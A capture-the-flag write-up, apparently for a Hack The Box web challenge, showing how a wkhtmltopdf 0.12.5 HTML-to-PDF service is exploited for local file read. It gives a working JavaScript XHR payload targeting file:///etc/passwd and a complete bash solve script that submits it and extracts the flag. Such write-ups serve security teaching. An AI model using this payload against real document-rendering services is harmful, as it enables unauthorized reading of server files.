---
title: BlindPDF
slug: blindpdf
category: Web
author: Arman Abrahamyan
tags: [web, lfi, wkhtmltopdf, html-to-pdf, xxe, ssrf]
description: A Flask HTML-to-PDF app on wkhtmltopdf 0.12.5 runs JavaScript with local-file access, so an XHR to file:///etc/passwd leaks the flag into the PDF.
---

A Flask web app converts user-supplied HTML into a PDF using **wkhtmltopdf 0.12.5 (Qt 4.8.7)**, a version whose WebKit engine executes JavaScript and permits local-file access by default. Injecting an HTML page with a synchronous `XMLHttpRequest` to `file:///etc/passwd` reads the file server-side and bakes its contents into the rendered PDF (LFI via HTML-to-PDF). The flag is planted in the GECOS field of the `flaguser` account.
- **Target:** `http://154.57.164.77:30776/`  -  `Server: Werkzeug/3.0.4 Python/3.12.6`.
- The homepage has a textarea that POSTs HTML to be "converted to PDF".
- `static/js/main.js` reveals the real flow:
  - `POST /api/cache` with JSON body `{"html": "..."}`
  - Response: `{"filename": "<hash>.pdf", ...}`
  - PDF is then served at `/static/pdfs/<filename>` - so despite the "blind" name, **the rendered PDF is returned to us**.
```bash
# Submit a harmless payload to learn the API shape
curl -s -X POST http://154.57.164.77:30776/api/cache \
  -H 'Content-Type: application/json' \
  -d '{"html":"<h1>hello test</h1>"}'
# => {"filename":"7a61e34592826278d4b0aff2fea3.pdf","level":"success",...}
```
## Fingerprint the renderer
Pulling any generated PDF and inspecting its metadata identifies the engine - this is what makes the LFI viable:
```bash
pdfinfo passwd.pdf
# Creator:  wkhtmltopdf 0.12.5
# Producer: Qt 4.8.7
```
`wkhtmltopdf 0.12.5` runs an old WebKit build with **JavaScript enabled** and, unless launched with `--disable-local-file-access`, allows scripts inside the rendered page to fetch `file://` URLs.
## Dead end
A direct local-file frame renders **blank**  -  direct `file://` in `<iframe>`/`<img>` is blocked:
```html
<iframe src="file:///etc/passwd" width="1000" height="1000"></iframe>
<!-- Produces an empty PDF page -->
```
The pivot: don't reference the file directly - **read it with JavaScript** and write the bytes into the DOM so `wkhtmltopdf` renders them.
### LFI via JavaScript `XMLHttpRequest` to `file://`
Submit HTML containing a synchronous XHR that reads `/etc/passwd` and dumps it into a `<pre>` element. wkhtmltopdf executes the JS during rendering, so the file contents land in the PDF we get back.
```bash
#!/bin/bash
set -euo pipefail
BASE="http://154.57.164.77:30776"

PAYLOAD='<html><body><pre id="o"></pre>
<script>
var x = new XMLHttpRequest();
x.open("GET", "file:///etc/passwd", false);  // sync so render waits for it
x.send();
document.getElementById("o").textContent = x.responseText;
</script></body></html>'

RESP=$(curl -s -X POST "$BASE/api/cache" \
  -H 'Content-Type: application/json' \
  --data "$(jq -nc --arg h "$PAYLOAD" '{html:$h}')")
FN=$(echo "$RESP" | jq -r .filename)

curl -s "$BASE/static/pdfs/$FN" -o leak.pdf

pdftotext -layout leak.pdf - | grep -oE 'HTB\{[^}]+\}'
```
Running it:
```bash
$ bash solve.sh
HTB{PdF_g3n_w1th_LF1_sp1c3_2bb54023db5d0bd3608b11c6d6a3b2db}
```
